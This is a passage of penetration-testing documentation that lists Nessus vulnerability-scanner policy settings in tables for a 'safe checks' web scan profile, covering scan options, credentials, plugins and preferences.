<tr class="row-odd"><td>Oracle auth type</td>
<td>NORMAL</td>
</tr>
<tr class="row-even"><td>SQL Server auth type</td>
<td>Windows</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Do not scan fragile devices</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-odd"><td>Scan Network Printers</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Scan Novell Netware hosts</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Global variable settings</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-odd"><td>Probe services on every port</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td><div class="first last line-block">
<div class="line">Do not log in with user accounts not</div>
<div class="line">specified in the policy</div>
</div>
</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Enable CGI scanning</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Network type</td>
<td>Mixed (use RFC 1918)</td>
</tr>
<tr class="row-odd"><td>Enable experimental scripts</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Thorough tests (slow)</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Report verbosity</td>
<td>Normal</td>
</tr>
<tr class="row-even"><td>Report paranoia</td>
<td>Normal</td>
</tr>
<tr class="row-odd"><td>HTTP User-Agent</td>
<td>Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)</td>
</tr>
<tr class="row-even"><td>SSL certificate to use</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SSL CA to trust</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>SSL key to use</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SSL password for SSL key</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>HTTP cookies import</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Cookies file</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>HTTP login page</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Login page</td>
<td>/</td>
</tr>
<tr class="row-even"><td>Login form</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Login form fields</td>
<td>user=%USER%&amp;password=%PASS%</td>
</tr>
<tr class="row-even"><td>Login form method</td>
<td>POST</td>
</tr>
<tr class="row-odd"><td>Re-authenticate delay (seconds)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Check authentication on page</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Follow 30x redirections (# of levels)</td>
<td>2</td>
</tr>
<tr class="row-even"><td>Authenticated regex</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Invert test (disconnected if regex matches)</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Match regex on HTTP headers</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Case insensitive regex</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>ICCP/COTP TSAP Addressing</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Start COTP TSAP</td>
<td>8</td>
</tr>
<tr class="row-odd"><td>Stop COTP TSAP</td>
<td>8</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Login configurations</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>HTTP account</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>HTTP password (sent in clear)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>NNTP account</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>NNTP password (sent in clear)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>FTP account</td>
<td>Anonymous</td>
</tr>
<tr class="row-odd"><td>FTP password (sent in clear)</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>FTP writeable directory</td>
<td>/incoming</td>
</tr>
<tr class="row-odd"><td>POP2 account</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>POP2 password (sent in clear)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>POP3 account</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>POP3 password (sent in clear)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>IMAP account</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>IMAP password (sent in clear)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Modbus/TCP Coil Access</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Start reg</td>
<td>0</td>
</tr>
<tr class="row-even"><td>End reg</td>
<td>16</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Nessus SYN scanner</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Firewall detection</td>
<td>Automatic (normal)</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Nessus TCP scanner</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Firewall detection</td>
<td>Automatic (normal)</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>News Server (NNTP) Information Disclosure</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>From address</td>
<td>Nessus &lt;<a class="reference external" href="mailto:listme&#37;&#52;&#48;listme&#46;dsbl&#46;org">listme<span>&#64;</span>listme<span>&#46;</span>dsbl<span>&#46;</span>org</a>&gt;</td>
</tr>
<tr class="row-even"><td>Test group name regex</td>
<td>f[a-z]\.tests?</td>
</tr>
<tr class="row-odd"><td>Max crosspost</td>
<td>7</td>
</tr>
<tr class="row-even"><td>Local distribution</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>No archive</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Nikto (NASL wrapper)</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Enable Nikto</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Disable if server never replies 404</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Root directory</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Pause between tests (s)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Scan CGI directories</td>
<td>User supplied</td>
</tr>
<tr class="row-odd"><td>Display: 1 Show redirects</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Display: 2 Show cookies received</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Display: 3 Show all 200/OK responses</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Display: 4 Show URLs which require authentication</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Display: V Verbose Output</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Tuning: 1 Interesting File/Seen in logs</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Tuning: 2 Misconfiguration / Default File</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Tuning: 3 Information Disclosure</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Tuning: 4 Injection (XSS/Script/HTML)</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Oracle Settings</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Oracle SID</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Test default accounts (slow)</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>PCI DSS Compliance</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Check for PCI-DSS compliance</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Ping the remote host</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>TCP ping destination port(s)</td>
<td>Built-in</td>
</tr>
<tr class="row-even"><td>Do an ARP ping</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>Do a TCP ping</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Do an ICMP ping</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>Number of Retries (ICMP)</td>
<td>2</td>
</tr>
<tr class="row-even"><td>Do an applicative UDP ping (DNS, RPCÖ)</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Make the dead hosts appear in the report</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Log live hosts in the report</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Test the local Nessus host</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Fast network discovery</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Port scanners settings</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Check open TCP ports found by local port enumerators</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Only run network port scanners if local port enumeration failed</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>SMB Registry: Start the Registry Service during the scan</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Start the Registry Service during the scan</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>SMB Scope</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Request information about the domain</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>SMB use domain SID to enumerate users</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Start UID</td>
<td>1000</td>
</tr>
<tr class="row-even"><td>End UID</td>
<td>1200</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>SMB use host SID to enumerate local users</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Start UID</td>
<td>1000</td>
</tr>
<tr class="row-even"><td>End UID</td>
<td>1200</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>SMTP settings</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Third party domain</td>
<td>Example.com</td>
</tr>
<tr class="row-even"><td>From address</td>
<td><a class="reference external" href="mailto:nobody&#37;&#52;&#48;example&#46;com">nobody<span>&#64;</span>example<span>&#46;</span>com</a></td>
</tr>
<tr class="row-odd"><td>To address</td>
<td>postmaster&#64;[AUTO_REPLACED_IP]</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>SNMP settings</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Community name</td>
<td>Public</td>
</tr>
<tr class="row-odd"><td>UDP port</td>
<td>161</td>
</tr>
<tr class="row-even"><td>SNMPv3 user name</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SNMPv3 authentication password</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>SNMPv3 authentication algorithm</td>
<td>MD5</td>
</tr>
<tr class="row-odd"><td>SNMPv3 privacy password</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>SNMPv3 privacy algorithm</td>
<td>DES</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Service Detection</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Test SSL based services</td>
<td>Known SSL ports</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Unix Compliance Checks</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Policy file #1</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #2</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #3</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #4</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #5</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Web Application Tests Settings</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Enable web applications tests</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Maximum run time (min)</td>
<td>60</td>
</tr>
<tr class="row-odd"><td>Send POST requests</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Combinations of arguments values</td>
<td>one value</td>
</tr>
<tr class="row-odd"><td>HTTP Parameter Pollution</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Stop at first flaw</td>
<td>Per port (quicker)</td>
</tr>
<tr class="row-odd"><td>Test embedded web servers</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>URL for Remote File Inclusion</td>
<td><a class="reference external" href="http://rfi.nessus.org/rfi.txt">http://rfi.nessus.org/rfi.txt</a></td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Web mirroring</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Number of pages to mirror</td>
<td>1000</td>
</tr>
<tr class="row-even"><td>Maximum depth</td>
<td>6</td>
</tr>
<tr class="row-odd"><td>Start page</td>
<td>/</td>
</tr>
<tr class="row-even"><td>Excluded items regex</td>
<td>/server_privileges\.php</td>
</tr>
<tr class="row-odd"><td>Follow dynamic pages</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Windows Compliance Checks</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Policy file #1</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #2</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #3</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #4</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #5</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Windows File Contents Compliance Checks</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Policy file #1</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #2</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #3</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #4</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #5</td>
<td>Blank</td>
</tr>
</tbody>
</table>
<div class="line-block">
<div class="line">In order to ensure that all tests are conducted with the same
criteria, you will need to ensure that you have created a policy
called &#8220;Only Safe Checks (Web)&#8221;. In order to do this you will need to
connect to the Nessus server UI, so that you can create a custom
policy by clicking on the &#8220;Policies&#8221; option on the bar at the top and
then &#8220;+ Add&#8221; button on the right. The &#8220;Add Policy&#8221; screen will be
displayed as follows:</div>
<div class="line-block">
<div class="line"><a class="reference external" href=":File:Penetration_Testing_Execution_163.png">Screenshot Here</a></div>
</div>
<div class="line">&#8216;&#8217;&#8216;</div>
</div>
<p>There are four configuration tabs: General, Credentials, Plugins, and
Preferences. For our purposes, most of the default settings do not need
to be modified.</p>
</div>
<div class="section" id="id89">
<h2>General<a class="headerlink" href="#id89" title="Permalink to this headline">¶</a></h2>
<p>The General tab is where we will name and configure scan options related
to our policy. There are six boxes of grouped options that control
scanner behavior: Basic, Scan, Network Congestion, Port Scanners, Port
Scan Options, and Performance.</p>
<p>Basic allows us to define the policy itself. The actual settings have
been defined as indicated below:</p>
<table border="1" class="docutils">
<colgroup>
<col width="48%" />
<col width="52%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td><strong>Basic Section</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>Name</td>
<td>Only Safe Checks (Web)</td>
</tr>
<tr class="row-odd"><td>Visibility</td>
<td>Shared</td>
</tr>
<tr class="row-even"><td>Description</td>
<td><div class="first last line-block">
<div class="line">Complete scans not including Denial of Service.</div>
</div>
</td>
</tr>
<tr class="row-odd"><td><strong>Scan Section</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>Save Knowledge Base</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>Safe Checks</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Silent Dependencies</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>Log Scan Details to Server</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Stop Host Scan on Disconnect</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Avoid Sequential Scans</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Consider Unscanned Ports as Closed</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Designate Hosts by their DNS Name</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Network Section</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>Reduce Parallel Connections on Congestion</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Use Kernel Congestion Detection (Linux Only)</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Port Scanners Section</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>TCP Scan</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>UDP Scan</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>SYN Scan</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>SNMP Scan</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Netstat SSH Scan</td>
<td>Checked</td>
</tr>
<tr class="row-odd"><td>Netstat WMI Scan</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Ping Host</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Port Scan Options Section</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-odd"><td>Port Scan Range</td>
<td><div class="first last line-block">
<div class="line">1-65535</div>
</div>
</td>
</tr>
<tr class="row-even"><td><strong>Performance Section</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-odd"><td>Max Checks Per Host (Windows)</td>
<td>5</td>
</tr>
<tr class="row-even"><td>Max Checks Per Host (Linux)</td>
<td>50-75</td>
</tr>
<tr class="row-odd"><td>Max Hosts Per Scan</td>
<td>5</td>
</tr>
<tr class="row-even"><td>Network Receive Timeout (seconds)</td>
<td>5</td>
</tr>
<tr class="row-odd"><td>Max Simultaneous TCP Sessions Per Host</td>
<td>Unlimited</td>
</tr>
<tr class="row-even"><td>Max Simultaneous TCP Sessions Per Scan</td>
<td>Unlimited</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="id90">
<h2>Credentials<a class="headerlink" href="#id90" title="Permalink to this headline">¶</a></h2>
<p>The Credentials tab, allows us to configure the Nessus scanner to use
authentication credentials during scanning. For our policy we will not
edit any of the settings within this section. They are however
documented to ensure completeness.</p>
<table border="1" class="docutils">
<colgroup>
<col width="71%" />
<col width="29%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td><strong>Windows credentials</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>SMB account</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SMB password</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>SMB domain (optional)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SMB password type</td>
<td>Password</td>
</tr>
<tr class="row-even"><td>Additional SMB account (1)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Additional SMB password (1)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Additional SMB domain (optional)(1)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Additional SMB account (2)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Additional SMB password (2)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Additional SMB domain (optional)(2)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Additional SMB account (3)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Additional SMB password (3)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Additional SMB domain (optional)(3)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Never send SMB credentials in clear text</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Only use NTLMv2</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>&#8216;&#8217;&#8216;SSH Settings &#8216;&#8217;&#8216;</td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-odd"><td>SSH user name</td>
<td>root</td>
</tr>
<tr class="row-even"><td>SSH password (unsafe!)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SSH public key to use</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>SSH private key to use</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Passphrase for SSH key</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Elevate privileges with</td>
<td>Nothing</td>
</tr>
<tr class="row-odd"><td>su login</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Escalation password</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SSH known_hosts file</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Preferred SSH port</td>
<td>22</td>
</tr>
<tr class="row-odd"><td>Client version</td>
<td>OpenSSH_5.0</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Kerberos configuration</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Kerberos Key Distribution Center (KDC)</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Kerberos KDC Port</td>
<td>88</td>
</tr>
<tr class="row-even"><td>Kerberos KDC Transport</td>
<td>UDP</td>
</tr>
<tr class="row-odd"><td>Kerberos Realm (SSH only)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>Cleartext protocols settings</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>User name</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Password (unsafe!)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Try to perform patch level checks over telnet</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Try to perform patch level checks over rsh</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Try to perform patch level checks over rexec</td>
<td>Unchecked</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="id91">
<h2>Plugins<a class="headerlink" href="#id91" title="Permalink to this headline">¶</a></h2>
<p>The Plugins tab, allows us to choose specific security checks by plugin
family or individual checks that we want to enable. The easiest way to
set this is to select the &#8220;Enable All&#8221; button from the main Plugins tab,
however this assumes the Safe Checks is selected from the General Tab.</p>
</div>
<div class="section" id="id92">
<h2>Preferences<a class="headerlink" href="#id92" title="Permalink to this headline">¶</a></h2>
<p>The Preferences tab allows for more granular control over scan settings.
All items in this category should be. The actual settings have been
defined as indicated below:</p>
<table border="1" class="docutils">
<colgroup>
<col width="50%" />
<col width="50%" />
</colgroup>
<tbody valign="top">
<tr class="row-odd"><td><strong>Cisco IOS Compliance Checks</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>Policy file #1</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #2</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #3</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #4</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #5</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td>&#8216;&#8217;&#8216;Database Compliance Checks &#8216;&#8217;&#8216;</td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-odd"><td>Policy file #1</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #2</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #3</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Policy file #4</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Policy file #5</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td>&#8216;&#8217;&#8216;Database Settings &#8216;&#8217;&#8216;</td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-even"><td>Login</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Password</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>DB Type</td>
<td>Oracle</td>
</tr>
<tr class="row-odd"><td>Database SID</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Database port to use</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Oracle auth type</td>
<td>NORMAL</td>
</tr>
<tr class="row-even"><td>SQL Server auth type</td>
<td>Windows</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Do not scan fragile devices</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-odd"><td>Scan Network Printers</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Scan Novell Netware hosts</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>Global variable settings</strong></td>
<td><strong>Setting</strong></td>
</tr>
<tr class="row-odd"><td>Probe services on every port</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td><div class="first last line-block">
<div class="line">Do not log in with user accounts not</div>
<div class="line">specified in the policy</div>
</div>
</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Enable CGI scanning</td>
<td>Checked</td>
</tr>
<tr class="row-even"><td>Network type</td>
<td>Mixed (use RFC 1918)</td>
</tr>
<tr class="row-odd"><td>Enable experimental scripts</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Thorough tests (slow)</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Report verbosity</td>
<td>Normal</td>
</tr>
<tr class="row-even"><td>Report paranoia</td>
<td>Normal</td>
</tr>
<tr class="row-odd"><td>HTTP User-Agent</td>
<td>Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)</td>
</tr>
<tr class="row-even"><td>SSL certificate to use</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SSL CA to trust</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>SSL key to use</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>SSL password for SSL key</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-odd"><td><strong>HTTP cookies import</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-even"><td>Cookies file</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>&nbsp;</td>
<td>&nbsp;</td>
</tr>
<tr class="row-even"><td><strong>HTTP login page</strong></td>
<td><strong>Settings</strong></td>
</tr>
<tr class="row-odd"><td>Login page</td>
<td>/</td>
</tr>
<tr class="row-even"><td>Login form</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Login form fields</td>
<td>user=%USER%&amp;password=%PASS%</td>
</tr>
<tr class="row-even"><td>Login form method</td>
<td>POST</td>
</tr>
<tr class="row-odd"><td>Re-authenticate delay (seconds)</td>
<td>Blank</td>
</tr>
<tr class="row-even"><td>Check authentication on page</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Follow 30x redirections (# of levels)</td>
<td>2</td>
</tr>
<tr class="row-even"><td>Authenticated regex</td>
<td>Blank</td>
</tr>
<tr class="row-odd"><td>Invert test (disconnected if regex matches)</td>
<td>Unchecked</td>
</tr>
<tr class="row-even"><td>Match regex on HTTP headers</td>
<td>Unchecked</td>
</tr>
<tr class="row-odd"><td>Case insensitive regex</td>
